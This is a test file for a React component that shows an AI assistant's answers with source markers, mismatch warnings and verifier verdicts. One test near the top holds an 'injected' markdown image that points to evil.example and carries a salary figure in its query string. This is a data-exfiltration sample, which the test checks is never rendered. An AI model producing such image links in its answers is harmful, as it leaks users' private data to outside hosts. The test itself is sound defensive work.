import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import {
  dontKnow,
  elenaSalary,
  markAverage,
  markOverdue,
  mismatch,
  northwind,
  unsourced,
} from "@/lib/__tests__/answers.fixture";
import { elena, quotes, topTwo } from "@/lib/__tests__/grounding.fixture";
import type { Message } from "@/lib/types";
import { AssistantMessage } from "../AssistantMessage";

const answer = (
  content: string,
  status: Message["status"] = "done",
  more: Partial<Message> = {},
): string =>
  renderToStaticMarkup(
    createElement(AssistantMessage, {
      message: {
        id: "a",
        role: "assistant",
        content,
        toolCalls: [],
        evidence: [],
        status,
        ...more,
      },
    }),
  );

const render = (message: Message): string =>
  renderToStaticMarkup(createElement(AssistantMessage, { message }));

/** What the reader sees: the text without the markup. */
const text = (html: string) => html.replace(/<[^>]+>/g, "").replaceAll("&#x27;", "'");

/** The markers' accessible names, in order. */
const labels = (html: string) =>
  [...html.matchAll(/<button[^>]*aria-label="([^"]+)"/g)].map((m) => m[1]);

describe("AssistantMessage", () => {
  it("givenAnswerWithAnImage_whenRendered_thenOnlyItsAltTextAndNoRequest", () => {
    // Arrange
    const injected = "Your salary is 78,000. ![chart](https://evil.example/p?d=78000)";
    // Act
    const html = answer(injected);
    // Assert
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("chart");
  });

  it("givenAnswerWithATable_whenRendered_thenSentenceCaseHeadsInARoundedCard", () => {
    // Arrange
    const table = "| Year | Left |\n|---|---|\n| 2026 | 12 |";

    // Act
    const html = answer(table);

    // Assert
    expect(html).toContain("rounded-xl border border-hairline");
    expect(html).not.toContain("uppercase");
    expect(html).toMatch(/<th[^>]*>Year<\/th>/);
  });

  it.each([
    ["Streaming", "<think>the salary column is", "streaming"],
    ["Done", "<think>the salary column is</think>", "done"],
  ] as const)("givenThinking%s_whenRendered_thenNoneOfItShows", (_, content, status) => {
    // Arrange / Act
    const html = answer(`${content}Your salary is 78,000.`, status);
    // Assert
    expect(html).not.toContain("salary column");
  });

  it("givenElenasSalary_whenRendered_thenTheFigureIsBoldWithSource1AndAPlainCard", () => {
    // Arrange
    const [, message] = elenaSalary;

    // Act
    const html = render(message);

    // Assert
    expect(html).toContain('<strong class="font-semibold text-ink">78,000 EUR</strong>');
    expect(labels(html)).toEqual(["Source 1"]);
    expect(text(html)).toContain("From compensation · Elena Varga · gross salary");
    expect(html).not.toMatch(/underline|decoration-/);
  });

  it("givenFiguresFromTwoSources_whenRendered_thenTheSourcesAreFoldedUnderUsedTools", () => {
    // Arrange
    const [, message] = markAverage;

    // Act
    const html = render(message);

    // Assert
    expect(html).toMatch(/<details aria-label="Tools used" class="[^"]*">/);
    expect(text(html)).toContain("Used 2 tools");
  });

  it("givenACallThatFailed_whenRendered_thenItsRowIsMarkedFailedWithTheReason", () => {
    // Arrange
    const message: Message = {
      id: "a",
      role: "assistant",
      content: "I could not send the e-mail.",
      status: "done",
      evidence: [],
      toolCalls: [
        {
          id: "call-1",
          tool: "send_email",
          args: { body: "salaries" },
          done: true,
          error: "unreachable",
        },
      ],
    };

    // Act
    const html = render(message);

    // Assert
    expect(text(html)).toContain("Used 1 tool");
    expect(text(html)).toContain("Send emailFailed");
    expect(text(html)).toContain("Failed: could not be reached");
    expect(text(html).replaceAll("&quot;", '"')).toContain(
      'send_email\n{\n  "body": "salaries"\n}',
    );
  });

  it("givenFiguresFromTwoSources_whenRendered_thenNumberedByFirstAppearanceAndShared", () => {
    // Arrange
    const [, message] = markAverage;

    // Act
    const html = render(message);

    // Assert
    expect(labels(html)).toEqual(["Source 1", "Source 1", "Source 2", "Sources 1 and 2"]);
    expect(text(html)).toContain(
      "1Average gross salary per department where department is Sales · 1 row",
    );
    expect(text(html)).toContain("2Your compensation");
    expect(text(html)).toContain("From compensation · Sales · average gross salary");
    expect(text(html)).toContain("Difference: Mark Hollander 72,000 − Sales 64,250");
  });

  it("givenOverdueInvoices_whenRendered_thenTheTotalsCardAndOneMarkerForTheTable", () => {
    // Arrange
    const [, message] = markOverdue;

    // Act
    const html = render(message);

    // Assert
    expect(text(html)).toContain("Sum of 3 invoices: 45,000 + 27,500 + 17,500 EUR");
    expect(html).not.toMatch(/<td[^>]*>(?:(?!<\/td>).)*<button/);
    expect(html).toMatch(/<figcaption[^>]*>3 rows<span[^>]*><button[^>]*aria-label="Source 1"/);
    expect(text(html)).toContain("1Invoices where status is overdue · 3 rows");
    expect(html).toMatch(/<th scope="col" class="[^"]*text-right">Amount \(EUR\)<\/th>/);
  });

  it("givenAnUnsourcedFigure_whenRendered_thenAnAmberMarkerWithAGlyphAndTheCareLine", () => {
    // Arrange
    const [, message] = unsourced;

    // Act
    const html = render(message);

    // Assert
    expect(html).toMatch(
      /<button[^>]*aria-label="Not in the data"[^>]*bg-warn-wash[^>]*><span aria-hidden="true">!<\/span><\/button>/,
    );
    expect(text(html)).toContain("The model typed this instead of citing it.");
    expect(text(html)).toContain("The marked figures have no source. This answer is unverified.");
    expect(text(html)).not.toContain("Every figure checked");
  });

  it("givenAMismatch_whenRendered_thenARedMarkerSayingWhatDidNotHoldAndTheSharedNumber", () => {
    // Arrange
    const [, message] = mismatch;

    // Act
    const html = render(message);

    // Assert
    expect(labels(html)).toEqual(["Source 1, does not match", "Source 1"]);
    expect(html).toMatch(/aria-label="Source 1, does not match"[^>]*bg-error-wash/);
    expect(text(html)).toContain(
      "This doesn't match its source: the row is about Fabrikam Energie AG, not Northwind Bank AG",
    );
    expect(text(html)).toContain(
      "Invoices where status is overdue and amount (EUR) is at least 10000 · 2 rows",
    );
  });

  it("givenNorthwindsPriceCap_whenRendered_thenAQuoteAndTheDocumentsMarker", () => {
    // Arrange
    const [, message] = northwind;

    // Act
    const html = render(message);

    // Assert
    expect(html).toMatch(
      /<q>Price increases are capped[^<]*<\/q><span[^>]*><button[^>]*aria-label="Source 1"/,
    );
    expect(text(html)).toContain("Quoted from Master agreement Northwind Bank AG · Pricing");
    expect(text(html)).toContain("1Master agreement Northwind Bank AG · Pricing · document");
  });

  it("givenIDontKnowAfterAToolRan_whenRendered_thenItsSourceShowsADashAndNothingReadable", () => {
    // Arrange
    const [, message] = dontKnow;

    // Act
    const html = render(message);

    // Assert
    expect(text(html)).toContain("I don't know");
    expect(text(html)).toContain("–Mark Hollander's compensation · nothing you may read");
    expect(text(html)).not.toMatch(/checked|need care/);
  });

  it("givenAllFiguresSourced_whenRendered_thenOneQuietLineAndNoBadgeOrTools", () => {
    // Arrange
    const [, message] = elenaSalary;

    // Act
    const html = render(message);

    // Assert
    expect(text(html)).toContain("✓ Every figure checked against its source");
    expect(html).not.toMatch(/All figures sourced|ok-wash|>Tools</);
  });

  it.each([
    ["ElenasSalary", elenaSalary],
    ["MarksOverdueInvoices", markOverdue],
    ["Northwind", northwind],
    ["MarksDepartmentAverage", markAverage],
    ["AnUnsourcedFigure", unsourced],
    ["AMismatch", mismatch],
    ["IDontKnow", dontKnow],
  ])("given%s_whenRendered_thenNoRawIdReachesTheReader", (_, [, message]) => {
    // Arrange / Act
    const shown = text(render(message));

    // Assert
    expect(shown).not.toMatch(/ev-\d|call-\d|\b[fuqt]\d+\b|\{t/);
  });

  it("givenAMismatchedTable_whenRendered_thenItsMarkerIsRedAndSaysWhyInPlainWords", () => {
    // Arrange
    const table = {
      ...topTwo,
      status: "mismatch" as const,
      reason: "Tailspin Air (r7) belongs in the top 2 by income and is missing",
    };

    // Act
    const html = answer("", "done", { segments: [{ table: "t1" }], figures: [], tables: [table] });

    // Assert
    expect(html).toMatch(/aria-label="Source 1, does not match"[^>]*bg-error-wash/);
    expect(text(html)).toContain(
      "This table doesn't match its source: Tailspin Air belongs in the top 2 by income and is missing",
    );
  });

  it("givenAMismatchedQuote_whenRendered_thenTheCardSaysTheWordsAreNotInTheDocument", () => {
    // Arrange
    const segments = [{ text: "Management will " }, { quote: "q2" }, { text: "." }];
    const quote = { ...quotes.mismatch, reason: "these words are not in ev-5, passage 2" };
    const provenance = {
      status: "no_figures" as const,
      sourced: 0,
      computed: 0,
      unsourced: 0,
      mismatch: 0,
    };

    // Act
    const html = answer("", "done", { segments, figures: [], quotes: [quote], provenance });

    // Assert
    expect(html).toMatch(/aria-label="Source 1, does not match"/);
    expect(text(html)).toContain("These words aren't in Engagement letter · Related parties");
    expect(text(html)).toContain(
      "The marked quotes don't match their source. This answer is unverified.",
    );
  });

  it("givenAMarker_whenRendered_thenAButtonDescribedByItsCard", () => {
    // Arrange
    const [, message] = elenaSalary;

    // Act
    const html = render(message);

    // Assert
    const [, card] = html.match(/<button[^>]*aria-describedby="([^"]+)"/)!;
    expect(html).toContain(`id="${card}" role="tooltip" hidden=""`);
  });

  it("givenProvenanceAndAPassingVerifier_whenRendered_thenTheVerdictLineCarriesItsNote", () => {
    // Arrange
    const verdicts = [
      {
        handler: "OwnRecordVerifier",
        status: "PASS" as const,
        note: "every figure is from your own record",
      },
    ];

    // Act
    const html = answer("", "done", { ...elena, verdicts });

    // Assert
    expect(text(html)).toContain("The marked figures have no source. This answer is unverified.");
    expect(text(html)).toContain("Own record verifier: every figure is from your own record");
    expect(html).toContain('<p class="mt-1 text-xs text-ink-tertiary">Own record verifier: ');
    expect(html).not.toContain("Verified");
  });

  it.each([
    ["PASS", "every figure is from your own record", ""],
    [
      "WARN",
      "the records do not mark the asking user's own row",
      '<span aria-hidden="true" class="font-semibold text-warn">! </span><span class="sr-only">warning. </span>',
    ],
    [
      "FAIL",
      "the answer gives Eric Lindholm's figure for a question about your own record",
      '<span aria-hidden="true" class="font-semibold text-error">! </span><span class="sr-only">fail. </span>',
    ],
  ] as const)(
    "givenAnOlderAnswerWithA%sVerdict_whenRendered_thenItsNoteLineIsMarkedByStatus",
    (status, note, marker) => {
      // Arrange
      const verdicts = [{ handler: "OwnRecordVerifier", status, note }];

      // Act
      const html = answer("Your gross salary is 78,000 EUR.", "done", { verdicts });

      // Assert
      expect(html).toContain("Your gross salary is 78,000 EUR.");
      expect(html).not.toContain("<button");
      expect(text(html)).toContain(`Own record verifier: ${note}`);
      expect(html).toContain(
        `<p class="mt-3 text-xs text-ink-tertiary">${marker}Own record verifier: `,
      );
      expect(html).not.toMatch(/verified/i);
    },
  );
});
